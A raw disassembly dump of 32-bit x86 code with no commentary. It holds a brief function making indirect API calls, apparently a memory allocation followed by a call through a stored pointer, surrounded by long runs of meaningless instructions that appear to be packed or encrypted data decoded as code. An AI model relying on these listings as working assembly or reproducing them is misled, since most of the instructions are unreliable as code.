  422d30:	dec    eax
  422d31:	loop   0x422d1b
  422d33:	xchg   edi,eax
  422d34:	mov    bl,0x95
  422d36:	clc    
  422d37:	mov    al,ds:0x5e25e4e2
  422d3c:	enter  0x20eb,0x72
  422d40:	repz adc DWORD PTR [ebx+0x46],0x14
  422d45:	xchg   ebx,eax
  422d46:	cmp    eax,0x16dfb51b
  422d4b:	xor    DWORD PTR [eax],esi
  422d4d:	pop    ebp
  422d4e:	lea    ebp,[ecx+ebp*1+0x7f]
  422d52:	arpl   WORD PTR [ecx+0x159f0ee0],sp
  422d58:	imul   eax,DWORD PTR [esi-0x4b],0x5a
  422d5c:	xlat   BYTE PTR ds:[ebx]
  422d5d:	sub    esp,DWORD PTR [ecx-0x69]
  422d60:	cmp    al,0x89
  422d62:	push   esi
  422d63:	xchg   DWORD PTR [esi-0x14363c1a],edi
  422d69:	jbe    0x422d53
  422d6b:	or     DWORD PTR [ebx-0x79],0x56
  422d6f:	pusha  
  422d70:	sbb    ebp,ebp
  422d72:	cld    
  422d73:	test   DWORD PTR [ebp-0x25451268],edx
  422d79:	in     al,0x9e
  422d7b:	adc    al,0x87
  422d7d:	and    edi,ebp
  422d7f:	xchg   edx,eax
  422d80:	pop    sp
  422d82:	sbb    al,0xd2
  422d84:	push   edx
  422d85:	fisub  WORD PTR [edx-0x631cd6f]
  422d8b:	xor    edx,DWORD PTR [ecx-0x63]
  422d8e:	jb     0x422d65
  422d90:	ror    BYTE PTR [edi-0x6b02a562],1
  422d96:	ss shl al,1
  422d99:	mov    ds:0xdf2190b8,al
  422d9e:	mov    eax,0x49667871
  422da3:	dec    esp
  422da4:	call   0x59e6:0x26d2609f
  422dab:	jae    0x422e1e
  422dad:	sbb    al,BYTE PTR [ebx]
  422daf:	leave  
  422db0:	or     ch,0x38
  422db3:	or     BYTE PTR [edx+eax*2+0x2e],ch
  422db7:	int3   
  422db8:	stos   DWORD PTR es:[edi],eax
  422db9:	inc    esi
  422dba:	push   ebx
  422dbb:	or     BYTE PTR [eax],0xf1
  422dbe:	iret   
  422dbf:	add    DWORD PTR [ebp+esi*4-0x38],esp
  422dc3:	cmp    al,0xc8
  422dc5:	js     0x422e35
  422dc7:	sub    bh,dl
  422dc9:	sbb    eax,0x284a3669
  422dce:	mov    cl,BYTE PTR [esp+ecx*2-0x69]
  422dd2:	les    esp,FWORD PTR [ecx+0x76]
  422dd5:	mov    BYTE PTR [ebx-0x7d],dh
  422dd8:	push   edi
  422dd9:	inc    cx
  422ddb:	jge    0x422dd7
  422ddd:	fld    TBYTE PTR [ecx]
  422ddf:	cli    
  422de0:	daa    
  422de1:	shr    al,cl
  422de3:	js     0x422e19
  422de5:	cmp    esp,ecx
  422de7:	sub    BYTE PTR [edx],ch
  422de9:	xor    DWORD PTR [ebx],ebp
  422deb:	mov    ds:0x403b2b67,eax
  422df0:	xor    eax,0x14216b61
  422df5:	icebp  
  422df6:	xor    BYTE PTR [edi],0x86
  422df9:	mov    ch,0x12
  422dfb:	iret   
  422dfc:	clc    
  422dfd:	mov    esp,esp
  422dff:	mov    esp,ebp
  422e01:	and    al,0xee
  422e03:	push   cs
  422e04:	jnp    0x422dc9
  422e06:	and    DWORD PTR [ebp-0x44c8333d],0x1cc00f9a
  422e10:	ror    al,1
  422e12:	mov    eax,ds:0x94058a0e
  422e17:	pop    ds
  422e18:	cwde   
  422e19:	push   0x38771e37
  422e1e:	jne    0x422dc7
  422e20:	dec    esp
  422e21:	fwait
  422e22:	pusha  
  422e23:	shl    DWORD PTR [eax+ecx*8],1
  422e26:	inc    edi
  422e27:	inc    ebx
  422e28:	stos   BYTE PTR es:[edi],al
  422e29:	ds retf 0x7602
  422e2d:	les    ebx,FWORD PTR [eax-0x2dd182b7]
  422e33:	add    eax,0x28fe05c4
  422e38:	xchg   edi,eax
  422e39:	adc    ecx,DWORD PTR [ebp+0x61]
  422e3c:	dec    edx
  422e3d:	or     eax,0x3453d25c
  422e42:	jne    0x422e0a
  422e44:	ins    DWORD PTR es:[edi],dx
  422e45:	fist   DWORD PTR [eax+0x23]
  422e48:	xor    al,0x1a
  422e4a:	sub    DWORD PTR [ebx],ebx
  422e4c:	inc    ecx
  422e4d:	pop    esp
  422e4e:	ins    DWORD PTR es:[edi],dx
  422e4f:	scas   eax,DWORD PTR es:[edi]
  422e50:	jl     0x422de8
  422e52:	(bad)  
  422e53:	call   0xd5dac9e2
  422e58:	push   ebx
  422e59:	push   0x3ec9ed40
  422e5e:	data16 hlt 
  422e60:	pop    eax
  422e61:	cli    
  422e62:	adc    dl,dh
  422e64:	int    0x9b
  422e66:	stc    
  422e67:	js     0x422e83
  422e69:	cmp    al,0xf9
  422e6b:	push   cs
  422e6c:	push   0x9bbbd291
  422e71:	int    0x85
  422e73:	in     eax,dx
  422e74:	and    eax,0x78011fb9
  422e79:	daa    
  422e7a:	ins    BYTE PTR es:[edi],dx
  422e7b:	data16 mov cl,0xef
  422e7e:	lods   eax,DWORD PTR ds:[esi]
  422e7f:	cwde   
  422e80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e81:	js     0x422e64
  422e83:	and    ebp,DWORD PTR ds:0xada6a217
  422e89:	pop    esp
  422e8a:	or     bh,BYTE PTR [ebp+0x46]
  422e8d:	mov    esi,0x6eaeba0
  422e92:	xor    dh,BYTE PTR [esi+0x34290fc5]
  422e98:	mov    ds:0x8c434c58,eax
  422e9d:	cmp    DWORD PTR [ebx+0x19ea0543],esi
  422ea3:	pusha  
  422ea4:	jo     0x422eb3
  422ea6:	mov    ah,0xa3
  422ea8:	mov    ebx,0x90f75f68
  422ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422eae:	cmp    edx,DWORD PTR [ebp+0x7caf2938]
  422eb4:	push   ds
  422eb5:	mov    dh,0xf0
  422eb7:	into   
  422eb8:	les    ecx,FWORD PTR [ebp-0x3d]
  422ebb:	sub    ah,al
  422ebd:	retf   0x1fa7
  422ec0:	jb     0x422e4d
  422ec2:	mov    ebp,0x88add0d0
  422ec7:	add    esp,DWORD PTR [esi-0x42]
  422eca:	(bad)  
  422ecb:	xchg   edi,eax
  422ecc:	pop    ebx
  422ecd:	dec    DWORD PTR [esi+0x1d]
  422ed0:	cmc    
  422ed1:	test   al,0x5c
  422ed3:	cmp    bh,BYTE PTR [edx+edx*8]
  422ed6:	jp     0x422f31
  422ed8:	scas   al,BYTE PTR es:[edi]
  422ed9:	push   ebp
  422eda:	xchg   ch,bh
  422edc:	mov    ds:0x2d74ba82,eax
  422ee1:	cmp    eax,0xdd6b1ea
  422ee6:	mov    esp,0x1d8e1294
  422eeb:	outs   dx,DWORD PTR ds:[esi]
  422eec:	jl     0x422e7c
  422eee:	pop    ebx
  422eef:	or     DWORD PTR [ecx+0x51],esp
  422ef2:	sahf   
  422ef3:	cmp    al,dl
  422ef5:	xchg   edx,eax
  422ef6:	sub    BYTE PTR [ebx+ecx*8+0x39e6196a],0xb4
  422efe:	sti    
  422eff:	arpl   WORD PTR [eax+0x0],bx
  422f02:	daa    
  422f03:	or     DWORD PTR [eax-0x33],ebx
  422f06:	xchg   esi,eax
  422f07:	sbb    bl,BYTE PTR [esi-0x5cfd1b33]
  422f0d:	adc    al,0x60
  422f0f:	(bad)  [ebx]
  422f11:	dec    ecx
  422f12:	ret    0xdd7
  422f15:	pop    ebx
  422f16:	sbb    BYTE PTR [edx+0x7bd18f28],bl
  422f1c:	mov    DWORD PTR [esi+0x7b],edi
  422f1f:	loop   0x422ee9
  422f21:	add    DWORD PTR [ecx],esp
  422f23:	jns    0x422f7f
  422f25:	pop    esi
  422f26:	outs   dx,DWORD PTR ds:[esi]
  422f27:	mov    ebp,0x94dfb265
  422f2c:	xlat   BYTE PTR ds:[ebx]
  422f2d:	push   0xffffff8c
  422f2f:	scas   al,BYTE PTR es:[edi]
  422f30:	mov    edx,0xb21d25e1
  422f35:	test   BYTE PTR [eax+0x61],0x22
  422f39:	sub    ah,al
  422f3b:	jecxz  0x422fac
  422f3d:	leave  
  422f3e:	mov    ah,0xd1
  422f40:	push   ebp
  422f41:	jmp    0x88ab:0xeb76f34d
  422f48:	and    al,0xd5
  422f4a:	scas   al,BYTE PTR es:[edi]
  422f4b:	in     al,0xbd
  422f4d:	mov    ds:0xc2f30b44,eax
  422f52:	jmp    0xec76:0x214c7a66
  422f59:	cmp    BYTE PTR [esi-0x6d],bl
  422f5c:	mov    edi,0x26e0bd7a
  422f61:	mov    eax,0x2d0323c8
  422f66:	sub    al,0x7c
  422f68:	adc    esp,esi
  422f6a:	outs   dx,BYTE PTR ds:[esi]
  422f6b:	mov    bl,0x49
  422f6d:	push   ds
  422f6e:	stos   DWORD PTR es:[edi],eax
  422f6f:	adc    BYTE PTR [ecx-0x5506b6c1],dl
  422f75:	xchg   esi,eax
  422f76:	ins    BYTE PTR es:[edi],dx
  422f77:	jne    0x422f6a
  422f79:	dec    esi
  422f7a:	mov    eax,0x1
  422f7f:	mov    esp,ebp
  422f81:	pop    ebp
  422f82:	ret    
  422f83:	int3   
  422f84:	int3   
  422f85:	int3   
  422f86:	int3   
  422f87:	int3   
  422f88:	int3   
  422f89:	int3   
  422f8a:	int3   
  422f8b:	int3   
  422f8c:	int3   
  422f8d:	int3   
  422f8e:	int3   
  422f8f:	int3   
  422f90:	push   ebp
  422f91:	mov    ebp,esp
  422f93:	sub    esp,0x8
  422f96:	push   esi
  422f97:	push   0x0
  422f99:	mov    DWORD PTR [ebp-0x4],0x0
  422fa0:	call   DWORD PTR ds:0x42905c
  422fa6:	mov    esi,DWORD PTR ds:0x429030
  422fac:	push   0x4
  422fae:	push   0x1000
  422fb3:	push   0x4cf
  422fb8:	push   0x1000
  422fbd:	mov    DWORD PTR [ebp-0x8],esi
  422fc0:	call   DWORD PTR ds:0x429058
  422fc6:	test   esi,esi
  422fc8:	jne    0x422fd2
  422fca:	push   esi
  422fcb:	push   esi
  422fcc:	call   DWORD PTR ds:0x429014
  422fd2:	push   0xa
  422fd4:	push   0x0
  422fd6:	push   0x0
  422fd8:	call   DWORD PTR ds:0x429054
  422fde:	push   0x0
  422fe0:	push   0x4e
  422fe2:	push   0x1e
  422fe4:	push   0x0
  422fe6:	push   0xffffffff
  422fe8:	call   DWORD PTR ds:0x429088
  422fee:	test   eax,eax
  422ff0:	je     0x422ffa
  422ff2:	push   0x0
  422ff4:	call   DWORD PTR ds:0x42904c
  422ffa:	mov    esi,DWORD PTR [ebp-0x8]
  422ffd:	call   esi
  422fff:	mov    DWORD PTR [ebp-0x4],eax
  423002:	cmp    DWORD PTR [ebp-0x4],0x57
  423006:	jne    0x42301d
  423008:	push   0x3bb5902b
  42300d:	call   0x4111f0
  423012:	add    esp,0x4
  423015:	push   0x0
  423017:	call   DWORD PTR ds:0x429048
  42301d:	push   0x0
  42301f:	call   DWORD PTR ds:0x429044
  423025:	xor    eax,eax
  423027:	pop    esi
  423028:	mov    esp,ebp
  42302a:	pop    ebp
  42302b:	ret    
  42302c:	nop
  42302d:	nop
  42302e:	nop
  42302f:	nop
  423030:	sub    esp,0x10
  423033:	push   esi
  423034:	mov    esi,DWORD PTR ds:0x42915c
  42303a:	push   0x5
  42303c:	push   0x0
  42303e:	call   esi
  423040:	push   0x5
  423042:	push   0x0
  423044:	call   esi
  423046:	push   0x0
  423048:	push   0x0
  42304a:	push   0x0
  42304c:	call   DWORD PTR ds:0x429040
  423052:	lea    eax,[esp+0x4]
  423056:	push   eax
  423057:	call   DWORD PTR ds:0x429068
  42305d:	call   DWORD PTR ds:0x429064
  423063:	cmp    WORD PTR [esp+0x4],0x0
  423069:	pop    esi
  42306a:	push   0x0
  42306c:	je     0x42308f
  42306e:	push   0x0
  423070:	push   0x100000
  423075:	call   DWORD PTR ds:0x429060
  42307b:	push   0x0
  42307d:	call   0x422f90
  423082:	add    esp,0x4
  423085:	call   0x411000
  42308a:	jmp    0x4244c4
  42308f:	push   0x3d
  423091:	push   0x20
  423093:	call   0x4244f6
  423098:	jmp    edi
  42309a:	dec    eax
  42309b:	push   edi
  42309c:	bswap  ebp
  42309e:	in     al,dx
  42309f:	push   cs
  4230a0:	cdq    
  4230a1:	repz (bad) 
  4230a3:	je     0x423072
  4230a5:	ins    DWORD PTR es:[edi],dx
  4230a6:	push   ebp
  4230a7:	adc    al,bh
  4230a9:	mov    bh,0xce
  4230ab:	in     al,dx
  4230ac:	push   cs
  4230ad:	cdq    
  4230ae:	test   edi,0xaa928d74
  4230b4:	adc    al,bh
  4230b6:	bswap  esi
  4230b8:	in     al,dx
  4230b9:	push   cs
  4230ba:	cdq    
  4230bb:	test   edi,0xaa92cd74
  4230c1:	adc    al,bh
  4230c3:	bswap  esi
  4230c5:	in     al,dx
  4230c6:	push   cs
  4230c7:	cdq    
  4230c8:	test   edi,0xaa92cd74
  4230ce:	adc    al,bh
  4230d0:	bswap  esi
  4230d2:	in     al,dx
  4230d3:	push   cs
  4230d4:	cdq    
  4230d5:	vmptrld QWORD PTR [ebp+ecx*8-0x64]
  4230da:	mov    ch,0xa8
  4230dc:	leave  
  4230dd:	(bad)  
  4230df:	in     eax,0xc3
  4230e1:	mov    eax,0x38c64f
  4230e6:	mov    bl,0xfe
  4230e8:	jp     0x423098
  4230ea:	jl     0x4230da
  4230ec:	pushf  
  4230ed:	jl     0x4230e5
  4230ef:	nop
  4230f0:	mov    ch,0x15
  4230f2:	mov    al,ds:0xa973c9b2
  4230f7:	popa   
  4230f8:	mov    eax,ds:0x92fb2e98
  4230fd:	out    0x6,eax
  4230ff:	mov    eax,0xa97b8afc
  423104:	das    
  423105:	mov    ah,BYTE PTR [ebx-0x576546a3]
  42310b:	adc    BYTE PTR [eax-0x32e05844],ch
  423111:	sub    ecx,esi
  423113:	in     al,dx
  423114:	push   cs
  423115:	cdq    
  423116:	test   edi,0x560bca74
  42311c:	dec    ebx
  42311d:	test   bh,dh
  42311f:	pop    esp
  423120:	out    0x4d,al
  423122:	popa   
  423123:	gs int 0x37
  423126:	xor    eax,0xa24aa000
  42312b:	add    eax,esp
  42312d:	mov    bl,0xf6
  42312f:	or     edi,ebp
  423131:	lahf   
  423132:	adc    ebp,esi
  423134:	cwde   
  423135:	push   0x960555ea
  42313a:	mov    DWORD PTR [edi],esi
  42313c:	xchg   ebx,eax
  42313d:	lahf   
  42313e:	aas    
  42313f:	out    0xc7,al
  423141:	mov    esi,0x49cd2b24
  423146:	ss jle 0x42314d
  423149:	shl    DWORD PTR [edi-0x2a],cl
  42314c:	jle    0x4230d5
  42314e:	push   0x38
  423150:	sbb    BYTE PTR [ebp+0x56e6cf8f],cl
  423156:	popa   
  423157:	gs int 0x37
  42315a:	xor    eax,0x3e3aa001
  42315f:	popf   
  423160:	les    edx,FWORD PTR [ebx-0x2a]
  423163:	sbb    ebp,edi
  423165:	mov    cl,BYTE PTR [edi+ebx*2-0x5880d68]
  42316c:	add    eax,0x939c14c6
  423171:	scas   eax,DWORD PTR es:[edi]
  423172:	mov    ds:0x52d0c77c,al
  423177:	or     ch,0x57
  42317a:	stos   DWORD PTR es:[edi],eax
  42317b:	jecxz  0x423181
  42317d:	fisttp DWORD PTR [edi]
  42317f:	push   ebp
  423180:	jle    0x423121
  423182:	sti    
  423183:	leave  
  423184:	jp     0x42310a
  423186:	neg    DWORD PTR [esi+eiz*8+0xe]
  42318a:	cdq    
  42318b:	test   edi,0xaa92cd74
  423191:	inc    edx
  423192:	or     BYTE PTR [edi],0xce
  423195:	mov    al,ds:0x2bf79b0f
  42319a:	xchg   edi,eax
  42319b:	xchg   edx,eax
  42319c:	(bad)  [edx-0x31f038ee]
  4231a2:	in     al,dx
  4231a3:	push   cs
  4231a4:	cdq    
  4231a5:	pop    ss
  4231a6:	(bad)  
  4231a7:	ja     0x423175
  4231a9:	cdq    
  4231aa:	stos   DWORD PTR es:[edi],eax
  4231ab:	sbb    bh,al
  4231ad:	mov    cr5,eax
  4231b0:	push   cs
  4231b1:	cdq    
  4231b2:	repz shl DWORD PTR [ebp+ecx*8-0x6e],0xaa
  4231b8:	adc    al,dh
  4231ba:	mov    dl,0xce
  4231bc:	in     al,dx
  4231bd:	push   cs
  4231be:	mov    edi,esi
  4231c0:	(bad)  
  4231c1:	je     0x423190
  4231c3:	xchg   edi,eax
  4231c4:	stos   BYTE PTR es:[edi],al
  4231c5:	adc    al,bh
  4231c7:	dec    esi
  4231c8:	into   
  4231c9:	in     al,dx
  4231ca:	push   ds
  4231cb:	cdq    
  4231cc:	test   edi,0xaf92cd76
  4231d2:	adc    al,dh
  4231d4:	bswap  esi
  4231d6:	in     al,dx
  4231d7:	push   cs
  4231d8:	cdq    
  4231d9:	repnz (bad) 
  4231db:	jne    0x4231aa
  4231dd:	xchg   edx,eax
  4231de:	stos   BYTE PTR es:[edi],al
  4231df:	adc    al,bh
  4231e1:	cmovle esp,edi
  4231e4:	push   cs
  4231e5:	cdq    
  4231e6:	repz (bad) 
  4231e8:	je     0x42325a
  4231ea:	mov    ds:0xfc512af,eax
  4231ef:	into   
  4231f0:	ins    BYTE PTR es:[edi],dx
  4231f1:	push   cs
  4231f2:	cdq    
  4231f3:	out    0xc7,eax
  4231f5:	je     0x4231d4
  4231f7:	xchg   edx,eax
  4231f8:	stos   BYTE PTR es:[edi],al
  4231f9:	adc    al,bh
  4231fb:	pop    ds
  4231fc:	into   
  4231fd:	in     al,dx
  4231fe:	push   ds
  4231ff:	cdq    
  423200:	test   edi,0xba92cd74
  423206:	adc    al,bh
  423208:	bswap  esi
  42320a:	in     al,dx
  42320b:	push   cs
  42320c:	cdq    
  42320d:	test   edi,0xc416cd74
  423213:	sbb    edi,eax
  423215:	data16 int 0xec
  423218:	push   cs
  423219:	cdq    
  42321a:	(bad)  
  42321b:	int3   
  42321c:	je     0x423220
  42321e:	scas   eax,DWORD PTR es:[edi]
  42321f:	stos   BYTE PTR es:[edi],al
  423220:	adc    al,bh
  423222:	bswap  esi
  423224:	in     al,dx
  423225:	push   cs
  423226:	cdq    
  423227:	test   edi,0xaa92cd74
  42322d:	adc    al,bh
  42322f:	bswap  esi
  423231:	in     al,dx
  423232:	push   cs
  423233:	cdq    
  423234:	test   edi,0xaa92cd74
  42323a:	adc    al,bh
  42323c:	bswap  esi
  42323e:	in     al,dx
  42323f:	push   cs
  423240:	cdq    
  423241:	test   edi,0xaa92cd74
  423247:	adc    al,bh
  423249:	bswap  esi
  42324b:	in     al,dx
  42324c:	push   cs
  42324d:	cdq    
  42324e:	test   edi,0xaa92cd74
  423254:	adc    al,bh
  423256:	bswap  esi
  423258:	in     al,dx
  423259:	push   cs
  42325a:	cdq    
  42325b:	test   edi,0xaa92cd74
  423261:	adc    al,bh
  423263:	bswap  esi
  423265:	in     al,dx
  423266:	push   cs
  423267:	cdq    
  423268:	test   edi,0xaa92cd74
  42326e:	adc    al,bh
  423270:	bswap  esi
  423272:	in     al,dx
  423273:	push   cs
  423274:	cdq    
  423275:	test   edi,0xaa92cd74
  42327b:	adc    al,bh
  42327d:	bswap  esi
  42327f:	in     al,dx
  423280:	push   cs
  423281:	cdq    
  423282:	test   edi,0xaa92cd74
  423288:	adc    ch,cl
  42328a:	jnp    0x423237
  42328c:	xchg   esp,eax
  42328d:	jp     0x423228
  42328f:	test   edi,0xaa99ed74
  423295:	adc    dl,bh
  423297:	bswap  esi
  423299:	in     al,dx
  42329a:	xor    al,0x9d
  42329c:	test   edi,0xfa92cd70
  4232a2:	push   edi
  4232a3:	test   BYTE PTR ds:0x990ea39a,bh
  4232a9:	test   edi,0xaab2cd74
  4232af:	adc    ah,BYTE PTR [edi]
  4232b1:	and    DWORD PTR [edi+ebx*4-0x38080584],edi
  4232b8:	je     0x423287
  4232ba:	ret    0x12aa
  4232bd:	(bad)  
  4232be:	aas    
  4232bf:	(bad)
  4232c2:	leave  
  4232c3:	test   edi,0xaa96f374
  4232c9:	adc    al,bh
  4232cb:	bswap  esi
  4232cd:	in     al,dx
  4232ce:	push   cs
  4232cf:	cdq    
  4232d0:	test   edi,0x8a92cd74
  4232d6:	adc    al,bh
  4232d8:	out    dx,eax
  4232d9:	into   
  4232da:	in     al,dx
  4232db:	push   cs
  4232dc:	cdq    
  4232dd:	test   edi,0xaa92cd74
  4232e3:	adc    al,bh
  4232e5:	bswap  esi
  4232e7:	in     al,dx
  4232e8:	push   cs
  4232e9:	cdq    
  4232ea:	test   edi,0xaa92cd74
  4232f0:	adc    al,bh
  4232f2:	bswap  esi
  4232f4:	in     al,dx
  4232f5:	push   cs
  4232f6:	cdq    
  4232f7:	test   edi,0xaa92cd74
  4232fd:	adc    al,bh
  4232ff:	bswap  esi
  423301:	in     al,dx
  423302:	push   cs
  423303:	cdq    
  423304:	test   edi,0xaa92cd74
  42330a:	adc    al,bh
  42330c:	bswap  esi
  42330e:	in     al,dx
  42330f:	push   cs
  423310:	cdq    
  423311:	test   edi,0xaa92cd74
  423317:	adc    al,bh
  423319:	bswap  esi
  42331b:	in     al,dx
  42331c:	push   cs
  42331d:	cdq    
  42331e:	test   edi,0xaa92cd74
  423324:	adc    al,bh
  423326:	bswap  esi
  423328:	in     al,dx
  423329:	push   cs
  42332a:	cdq    
  42332b:	test   edi,0xaa92cd74
  423331:	adc    al,bh
  423333:	bswap  esi
  423335:	in     al,dx
  423336:	push   cs
  423337:	cdq    
  423338:	test   edi,0xaa92cd74
  42333e:	adc    al,bh
  423340:	bswap  esi
  423342:	in     al,dx
  423343:	push   cs
  423344:	cdq    
  423345:	test   edi,0xaa92cd74
  42334b:	adc    al,bh
  42334d:	bswap  esi
  42334f:	in     al,dx
  423350:	push   cs
  423351:	cdq    
  423352:	test   edi,0xaa92cd74
  423358:	adc    al,bh
  42335a:	bswap  esi
  42335c:	in     al,dx
  42335d:	push   cs
  42335e:	cdq    
  42335f:	test   edi,0xaa92cd74
  423365:	adc    al,bh
  423367:	bswap  esi
  423369:	in     al,dx
  42336a:	push   cs
  42336b:	cdq    
  42336c:	test   edi,0xaa92cd74
  423372:	adc    al,bh
  423374:	bswap  esi
  423376:	in     al,dx
  423377:	push   cs
  423378:	cdq    
  423379:	test   edi,0xaa92cd74
  42337f:	adc    al,bh
  423381:	bswap  esi
  423383:	in     al,dx
  423384:	push   cs
  423385:	cdq    
  423386:	test   edi,0xaa92cd74
  42338c:	adc    al,bh
  42338e:	bswap  esi
  423390:	in     al,dx
  423391:	push   cs
  423392:	cdq    
  423393:	test   edi,0xaa92cd74
  423399:	adc    al,bh
  42339b:	bswap  esi
  42339d:	in     al,dx
  42339e:	push   cs
  42339f:	cdq    
  4233a0:	test   edi,0xaa92cd74
  4233a6:	adc    al,bh
  4233a8:	bswap  esi
  4233aa:	in     al,dx
  4233ab:	push   cs
  4233ac:	cdq    
  4233ad:	test   edi,0xaa92cd74
  4233b3:	adc    al,bh
  4233b5:	bswap  esi
  4233b7:	in     al,dx
  4233b8:	push   cs
  4233b9:	cdq    
  4233ba:	test   edi,0xaa92cd74
  4233c0:	adc    al,bh
  4233c2:	bswap  esi
  4233c4:	in     al,dx
  4233c5:	push   cs
  4233c6:	cdq    
  4233c7:	test   edi,0xaa92cd74
  4233cd:	adc    al,bh
  4233cf:	bswap  esi
  4233d1:	in     al,dx
  4233d2:	push   cs
  4233d3:	cdq    
  4233d4:	test   edi,0xaa92cd74
  4233da:	adc    al,bh
  4233dc:	bswap  esi
  4233de:	in     al,dx
  4233df:	push   cs
  4233e0:	cdq    
  4233e1:	test   edi,0xaa92cd74
  4233e7:	adc    al,bh
  4233e9:	bswap  esi
  4233eb:	in     al,dx
  4233ec:	push   cs
  4233ed:	cdq    
  4233ee:	test   edi,0xaa92cd74
  4233f4:	adc    al,bh
  4233f6:	bswap  esi
  4233f8:	in     al,dx
  4233f9:	push   cs
  4233fa:	cdq    
  4233fb:	test   edi,0xaa92cd74
  423401:	adc    al,bh
  423403:	bswap  esi
  423405:	in     al,dx
  423406:	push   cs
  423407:	cdq    
  423408:	test   edi,0xaa92cd74
  42340e:	adc    al,bh
  423410:	bswap  esi
  423412:	in     al,dx
  423413:	push   cs
  423414:	cdq    
  423415:	test   edi,0xaa92cd74
  42341b:	adc    al,bh
  42341d:	bswap  esi
  42341f:	in     al,dx
  423420:	push   cs
  423421:	cdq    
  423422:	test   edi,0xaa92cd74
  423428:	adc    al,bh
  42342a:	bswap  esi
  42342c:	in     al,dx
  42342d:	push   cs
  42342e:	cdq    
  42342f:	test   edi,0xaa92cd74
  423435:	adc    al,bh
  423437:	bswap  esi
  423439:	in     al,dx
  42343a:	push   cs
  42343b:	cdq    
  42343c:	test   edi,0xaa92cd74
  423442:	adc    al,bh
  423444:	bswap  esi
  423446:	in     al,dx
  423447:	push   cs
  423448:	cdq    
  423449:	test   edi,0xaa92cd74
  42344f:	adc    al,bh
  423451:	bswap  esi
  423453:	in     al,dx
  423454:	push   cs
  423455:	cdq    
  423456:	test   edi,0xaa92cd74
  42345c:	adc    al,bh
  42345e:	bswap  esi
  423460:	in     al,dx
  423461:	push   cs
  423462:	cdq    
  423463:	test   edi,0xaa92cd74
  423469:	adc    al,bh
  42346b:	bswap  esi
  42346d:	in     al,dx
  42346e:	push   cs
  42346f:	cdq    
  423470:	test   edi,0xaa92cd74
  423476:	adc    al,bh
  423478:	bswap  esi
  42347a:	in     al,dx
  42347b:	push   cs
  42347c:	cdq    
  42347d:	test   edi,0xaa92cd74
  423483:	adc    al,bh
  423485:	bswap  esi
  423487:	in     al,dx
  423488:	push   cs
  423489:	cdq    
  42348a:	test   edi,0xaa92cd74
  423490:	adc    al,bh
  423492:	bswap  esi
  423494:	in     al,dx
  423495:	push   cs
  423496:	cdq    
  423497:	test   edi,0xaa982333
  42349d:	cmp    eax,0xecde0fc7
  4234a2:	push   cs
  4234a3:	mov    bl,0x55
  4234a5:	sbb    eax,0x876dab05
  4234aa:	mov    WORD PTR [eax+0x5f],es
  4234ad:	and    ebx,edx
  4234af:	out    0x8a,al
  4234b1:	inc    ebx
  4234b2:	push   edx
  4234b3:	adc    bh,BYTE PTR [esi+edx*1-0x4789fe10]
  4234ba:	fadd   DWORD PTR [ecx+0x17613ea]
  4234c0:	pop    edx
  4234c1:	scas   eax,DWORD PTR es:[edi]
  4234c2:	add    dl,BYTE PTR [ebp+0x7f40f42b]
  4234c8:	sti    
  4234c9:	sub    al,0x99
  4234cb:	shl    BYTE PTR [eax-0x4],1
  4234ce:	cwde   
  4234cf:	ret    
  4234d0:	(bad)  
  4234d1:	mov    ebx,0xf81332f5
  4234d6:	mov    edi,0x529ce7f9
  4234db:	fdivr  QWORD PTR [ebp-0x3d]
  4234de:	mov    bl,0xab
  4234e0:	call   0x150bf559
  4234e5:	mov    ds:0x5fbd4239,eax
  4234ea:	xor    edx,DWORD PTR [eax]
  4234ec:	addr16 (bad) 
  4234ee:	retf   0x777b
  4234f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234f2:	jmp    0x4234a6
  4234f4:	imul   edi,DWORD PTR [esp+edi*1+0x7d],0x84481f89
  4234fc:	loopne 0x423545
  4234fe:	xchg   esp,eax
  4234ff:	fwait
  423500:	jge    0x423500
  423502:	rcr    dl,0x54
  423505:	hlt    
  423506:	xor    BYTE PTR [edx],dh
  423508:	les    ecx,FWORD PTR [ecx+0x59342f58]
  42350e:	mov    ah,0xad
  423510:	inc    esp
  423511:	loope  0x423564
  423513:	and    ebp,ebp
  423515:	daa    
  423516:	cmp    al,0x45
  423518:	sbb    ch,BYTE PTR [edi]
  42351a:	in     al,dx
  42351b:	aam    0xc9
  42351d:	jns    0x423540
  42351f:	mov    WORD PTR [ebx+0x2d9e19ed],es
  423525:	sahf   
  423526:	ficom  DWORD PTR [esp+eiz*4]
  423529:	in     al,dx
  42352a:	div    eax
  42352c:	pop    edx
  42352d:	stc    
  42352e:	pop    esi
  42352f:	dec    ebp
  423530:	and    BYTE PTR [ebp+0x4d],cl
  423533:	sbb    al,0xc5
  423535:	pushf  
  423536:	pop    ss
  423537:	pop    eax
  423538:	push   0x8029ea42
  42353d:	pop    edx
  42353e:	xor    eax,0xcb0413e4
  423543:	dec    eax
  423544:	ret    0x7134
  423547:	cmc    
  423548:	and    al,0x7f
  42354a:	sbb    esp,ecx
  42354c:	fs push cs
  42354e:	and    BYTE PTR [edi+0x7af05943],al
  423554:	jmp    0x71de:0x8016ca65
  42355b:	pop    edi
  42355c:	dec    esi
  42355d:	push   ebx
  42355e:	mov    fs:0x1b066e94,eax
  423564:	and    ch,BYTE PTR [ebp+0x6a13273e]
  42356a:	push   0x1cca70b0
  42356f:	xor    edi,edx
  423571:	fsubrp st(2),st
  423573:	cli    
  423574:	inc    edi
  423575:	test   al,0x65
  423577:	das    
  423578:	(bad)  
  423579:	rol    DWORD PTR [esi+0x13],1
  42357c:	pop    ebp
  42357d:	pop    edi
  42357e:	rcr    DWORD PTR [esi-0xfaf5a60],0x6
  423585:	inc    ecx
  423586:	or     al,0xc9
  423588:	and    BYTE PTR [edx*4+0x52bca7f],0x6f
  423590:	(bad)  
  423591:	push   ss
  423592:	cs test eax,0x755ca449
  423598:	jmp    0xd317:0x5e68d78f
  42359f:	out    dx,eax
  4235a0:	test   eax,0x1a4ec9d
  4235a5:	test   eax,0x8191abd4
  4235aa:	cmp    ebp,DWORD PTR [edx-0x47]
  4235ad:	cmp    eax,0x198e3114
  4235b2:	jb     0x4235d8
  4235b4:	or     BYTE PTR [esi-0x15],ah
  4235b7:	pop    esi
  4235b8:	popf   
  4235b9:	xlat   BYTE PTR ds:[ebx]
  4235ba:	xchg   ecx,eax
  4235bb:	mov    WORD PTR [eax],gs
  4235bd:	sbb    BYTE PTR [ebp+0x2],bl
  4235c0:	sbb    eax,0x88c53724
